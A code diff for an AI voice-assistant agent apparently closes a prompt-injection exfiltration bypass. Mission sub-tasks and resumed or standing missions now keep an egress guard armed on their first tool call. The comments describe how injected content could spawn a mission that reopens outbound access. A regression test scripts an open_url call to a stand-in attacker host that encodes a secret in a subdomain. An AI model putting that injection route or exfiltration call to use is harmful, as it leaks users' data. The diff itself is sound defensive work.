@@ -1800,6 +1800,12 @@ pub async fn complete_with_tools(
     agent_persona: Option<&str>,
     world_context: &str,
     personalization: &str,
+    // Whether this cloud turn is a trusted, user-originated request (a direct user
+    // turn: true) or an UNTRUSTED nested/autonomous one (a mission sub-task, a
+    // resumed durable mission, a standing tick: false). Threaded into `tool_loop`
+    // so an untrusted loop keeps the prompt-injection egress guard armed even on
+    // its own call 0 (whose "utterance" is a machine-generated instruction).
+    context_trusted: bool,
 ) -> Result<String> {
     let api_key = resolve_api_key().await.ok_or_else(|| {
         anyhow!(
@@ -1866,7 +1872,7 @@ pub async fn complete_with_tools(
         TOOL_LOOP_BUDGET,
         tool_loop(
             model, max_tokens, &system, &mut messages, &brain, memory, &executed, &tools,
-            allowed_tools, namespace,
+            allowed_tools, namespace, context_trusted,
         ),
     )
     .await
@@ -2112,6 +2118,15 @@ async fn tool_loop(
     tools: &Value,
     allowed: &[String],
     namespace: &str,
+    // Whether THIS loop runs in a trusted, user-originated context (a direct user
+    // turn) vs. an UNTRUSTED nested/autonomous one (a mission sub-task spawned from
+    // injected content, a resumed durable mission, a standing-mission tick). For a
+    // trusted loop the egress guard scopes on the call index as usual (call 0 is the
+    // user's own utterance). For an untrusted loop EVERY call is treated as a
+    // continuation — the loop's own "call 0" is a machine-generated instruction, NOT
+    // a user utterance, so it must not re-open the egress channel. See the
+    // fury_mission/mission dispatch chain, which reset a fresh call-0 loop.
+    context_trusted: bool,
 ) -> Result<String> {
     // Whole-turn dedup ledger (RC-2): signature -> the outcome string of its
     // FIRST execution. A repeat signature in any later iteration is answered
@@ -2199,7 +2214,15 @@ async fn tool_loop(
             // context are the user's. `call >= 1` is a continuation in which prior
             // tool outputs (possibly attacker-injected fetched/MCP/email content)
             // are now in context — the regime the egress guard scopes to.
-            let user_originated = call == 0;
+            // BUT this "call 0 == user" premise only holds when the loop itself is
+            // TRUSTED. A mission sub-task (or a resumed/standing mission) spins a
+            // FRESH loop whose call-0 "utterance" is a machine-generated sub-task
+            // instruction, not a user utterance — and its system prompt is seeded
+            // with the user's world-model + personalization. So when
+            // `!context_trusted`, even call 0 is treated as a continuation and the
+            // egress guard stays armed, closing the exfiltration channel a nested
+            // loop would otherwise reopen.
+            let user_originated = context_trusted && call == 0;
             let (outcome, is_error) = execute_tool(
                 &name,
                 &block["input"],
@@ -6551,7 +6574,7 @@ async fn execute_tool(
         // the secret-free target summary we hand the (redacting) audit log.
         let mut preview_input = input.clone();
         force_confirm(&mut preview_input, false);
-        let (preview, is_error) = dispatch_tool(name, &preview_input, memory, namespace).await;
+        let (preview, is_error) = dispatch_tool(name, &preview_input, memory, namespace, user_originated).await;
         if is_error {
             // The action can't even be previewed (provider not connected / bad
             // args) — nothing worth parking, blocking, or auto-approving. Relay
@@ -6586,7 +6609,7 @@ async fn execute_tool(
                     crate::policy::Decision::Always, crate::audit::Outcome::AutoApprovedByPolicy,
                 ).await;
                 crate::telemetry::emit("system", "policy.auto_approved", json!({"tool": name, "agent": namespace}));
-                let (out, err) = dispatch_tool(name, &exec_input, memory, namespace).await;
+                let (out, err) = dispatch_tool(name, &exec_input, memory, namespace, user_originated).await;
                 crate::audit::record_global(
                     namespace, name, &preview,
                     crate::policy::Decision::Always,
@@ -6643,7 +6666,7 @@ async fn execute_tool(
         return (preview, false);
     }
 
-    dispatch_tool(name, input, memory, namespace).await
+    dispatch_tool(name, input, memory, namespace, user_originated).await
 }
 
 /// Spoken refusal when a user-set `Never` policy hard-blocks a consequential
@@ -6714,7 +6737,10 @@ pub async fn replay_confirmed_action(
         "confirm.replayed",
         json!({"tool": pending.tool, "agent": pending.agent}),
     );
-    dispatch_tool(&pending.tool, &input, memory, &pending.agent).await
+    // A replay executes an action the owner CONFIRMED via voice-id — user-approved,
+    // hence user_originated=true. (fury_mission is not consequential, so it never
+    // parks/replays; this value is a semantic default, not a reachable mission path.)
+    dispatch_tool(&pending.tool, &input, memory, &pending.agent, true).await
 }
 
 /// Set the `confirm` field on a tool input object to `value`, so a consequential
@@ -6844,6 +6870,11 @@ async fn dispatch_tool(
     input: &Value,
     memory: &Memory,
     namespace: &str,
+    // Whether the CALL that reached this dispatch was the user's own utterance
+    // (`true`) or a tool CONTINUATION (`false`, possibly injected content). Only the
+    // `fury_mission` arm reads it — to decide whether a spawned mission is trusted
+    // (its sub-tasks may egress) or untrusted (sub-tasks stay egress-guarded).
+    user_originated: bool,
 ) -> (String, bool) {
     // A CONFIRMED MCP REPLAY lands here (via `replay_confirmed_action`) with the
     // flat `mcp__<server>__<tool>` id and confirm forced true. Run it against the
@@ -7358,7 +7389,11 @@ async fn dispatch_tool(
         // sub-task runs its OWN cloud tool loop, so this never bypasses isolation
         // or the gate.
         "fury_mission" => match serde_json::from_value::<FuryMissionArgs>(input.clone()) {
-            Ok(args) => Ok(run_fury_mission(&args.goal, memory).await),
+            // Thread the CALL's origin: a fury_mission requested on a CONTINUATION
+            // (user_originated=false, i.e. possibly from injected content) spawns an
+            // UNTRUSTED mission whose sub-tasks stay egress-guarded; a direct call-0
+            // request spawns a trusted one. Closes the mission egress-guard bypass.
+            Ok(args) => Ok(run_fury_mission(&args.goal, memory, user_originated).await),
             Err(e) => Err(anyhow!("invalid fury_mission arguments: {e}")),
         },
         // -- Self-Forge (the app forge) ---------------------------------------
@@ -8091,7 +8126,13 @@ pub(crate) fn edith_brief_now() -> String {
 /// command into the SAME bounded mission engine the `fury_mission` tool uses —
 /// each sub-task still runs under its owning specialist's allowlist + the
 /// consequential gate, so the channel never escalates past a direct request.
-pub(crate) async fn run_fury_mission(goal: &str, memory: &Memory) -> String {
+/// `trusted` carries the ORIGIN of the turn that spawned this mission: `true` when
+/// the owner asked for it directly (a call-0 `fury_mission`, or the Mission-mode
+/// router/command path), `false` when it was requested on a tool CONTINUATION
+/// (i.e. possibly from prompt-injected content). It flows into every sub-task's
+/// `complete_with_tools` so a mission born of injected content cannot reset the
+/// egress guard to open on its sub-tasks' call 0 (the exfiltration bypass).
+pub(crate) async fn run_fury_mission(goal: &str, memory: &Memory, trusted: bool) -> String {
     let cloud_reachable = resolve_api_key().await.is_some();
     let registry = crate::agents::AgentRegistry::canonical();
     let model = mission_model().to_string();
@@ -8104,6 +8145,7 @@ pub(crate) async fn run_fury_mission(goal: &str, memory: &Memory) -> String {
         max_tokens: spoken_cap(SPOKEN_MAX_TOKENS),
         memory,
         orchestrator: registry.orchestrator().name.clone(),
+        context_trusted: trusted,
     };
     crate::mission::run_mission(goal, &registry, &planner, &dispatcher, cloud_reachable).await
 }
@@ -10001,7 +10043,10 @@ pub async fn propose_standing_mission(
                 crate::policy::Decision::Always, crate::audit::Outcome::AutoApprovedByPolicy,
             ).await;
             crate::telemetry::emit("system", "policy.auto_approved", json!({"tool": "standing_create", "agent": agent_namespace, "via": "selector"}));
-            let (out, err) = dispatch_tool("standing_create", &input, memory, agent_namespace).await;
+            // standing_create only PERSISTS the mission record — it never spawns a
+            // mission sub-task loop, so this flag is immaterial to egress here; the
+            // autonomous RUN later is independently marked untrusted (main.rs tick).
+            let (out, err) = dispatch_tool("standing_create", &input, memory, agent_namespace, true).await;
             crate::audit::record_global(
                 agent_namespace, "standing_create", &preview,
                 crate::policy::Decision::Always,
@@ -10228,6 +10273,12 @@ async fn mission_resume_tool(memory: &Memory, id: &str) -> String {
         max_tokens: spoken_cap(SPOKEN_MAX_TOKENS),
         memory,
         orchestrator: registry.orchestrator().name.clone(),
+        // A resumed durable mission runs AUTONOMOUSLY from a persisted goal (no live
+        // user utterance in this loop, and the saved goal may itself have come from
+        // injected content when it was created). Treat as UNTRUSTED so its sub-tasks
+        // stay egress-guarded — an unattended outbound GET is exactly the exfil we
+        // refuse. The owner does live web work interactively instead.
+        context_trusted: false,
     };
     telemetry::emit("system", "mission.resumed", json!({"id": id.trim()}));
     match crate::durable_missions::resume(memory, id, &registry, &planner, &dispatcher, cloud_reachable)
@@ -11364,8 +11415,59 @@ mod tests {
         tool_loop(
             "claude-test", 256, &system, &mut messages, brain, memory, executed, tools, allowed,
             "agent.jarvis",
+            true, // these loop tests model a direct user turn (trusted)
         )
         .await
+    }
+
+    /// SECURITY REGRESSION (mission egress-guard bypass). An UNTRUSTED loop — a
+    /// mission sub-task spawned from injected content, or a resumed/standing mission
+    /// — must keep the prompt-injection egress guard armed EVEN ON CALL 0, because
+    /// its "call 0" utterance is a machine-generated sub-task instruction, not the
+    /// user's. So a call-0 `open_url` to an attacker host must be REFUSED before the
+    /// actuator runs (no `/usr/bin/open`). Contrast: `context_trusted=true` is the
+    /// normal direct-user turn where call 0 is the user's own utterance and the guard
+    /// is scoped off — that path is covered elsewhere and would actuate, so we do NOT
+    /// exercise it here.
+    #[tokio::test]
+    async fn untrusted_loop_keeps_egress_guard_armed_on_call_zero() {
+        let (memory, tools, allowed) = loop_fixture("untrusted-egress");
+        // The sub-task model immediately tries a subdomain-encoded outward GET; the
+        // second scripted turn is the text it would speak after the refusal.
+        let script = vec![
+            tool_use_resp("t0", "open_url", json!({"url": "https://secret.attacker.tld"})),
+            text_resp("acknowledged"),
+        ];
+        let brain = ScriptedBrain::new(script);
+        let executed = std::sync::Mutex::new(Vec::new());
+        let system = Value::Null;
+        let mut messages = build_messages(&[], "machine-generated sub-task instruction");
+        // context_trusted = FALSE: the untrusted nested/autonomous regime.
+        let out = tool_loop(
+            "claude-test", 256, &system, &mut messages, &brain, &memory, &executed, &tools,
+            &allowed, "agent.sage", false,
+        )
+        .await
+        .expect("loop completes");
+
+        // The open_url call-0 must have been egress-REFUSED: the tool_result in the
+        // transcript carries the guard's refusal, and the actuator never ran (no
+        // "Opened ..." success string, and `executed` recorded no open).
+        let transcript = serde_json::to_string(&messages).expect("serialize transcript");
+        assert!(
+            transcript.contains("won't open") || transcript.contains("exfiltrate"),
+            "an untrusted call-0 open_url must be egress-refused: {transcript}"
+        );
+        assert!(
+            !transcript.contains("Opened https://"),
+            "the actuator must never have opened the attacker URL: {transcript}"
+        );
+        assert!(
+            !executed.lock().unwrap().iter().any(|e| e.contains("open")),
+            "no open_url actuation should be recorded: {:?}",
+            executed.lock().unwrap()
+        );
+        let _ = out;
     }
 
     /// A multi-step plan runs up to the cap then STOPS. The model asks for a
@@ -14386,6 +14488,7 @@ mod tests {
             &json!({"confirm": true, "path": "/tmp/x"}),
             &mem,
             "agent.jarvis",
+            true,
         )
         .await;
         assert!(is_error, "an unconnected MCP server must refuse the replay: {outcome}");
@@ -16825,6 +16928,7 @@ mod tests {
                     "attribute": "status", "value": "active"}),
             &mem,
             "agent.pepper",
+            true,
         )
         .await;
         assert!(!is_err, "world_update must not error: {out}");
@@ -16835,6 +16939,7 @@ mod tests {
             &json!({"from": "Project JARVIS", "relation": "owned by", "to": "Darwin"}),
             &mem,
             "agent.pepper",
+            true,
         )
         .await;
         assert!(!rel_err, "relationship write must not error: {rel_out}");
@@ -16845,6 +16950,7 @@ mod tests {
             &json!({"about": "jarvis"}),
             &mem,
             "agent.friday",
+            true,
         )
         .await;
         assert!(!q_err, "world_query is read-only and must not error: {q}");
@@ -16865,6 +16971,7 @@ mod tests {
             &json!({"about": "submarine fleet logistics"}),
             &mem,
             "agent.jarvis",
+            true,
         )
         .await;
         assert!(!is_err);
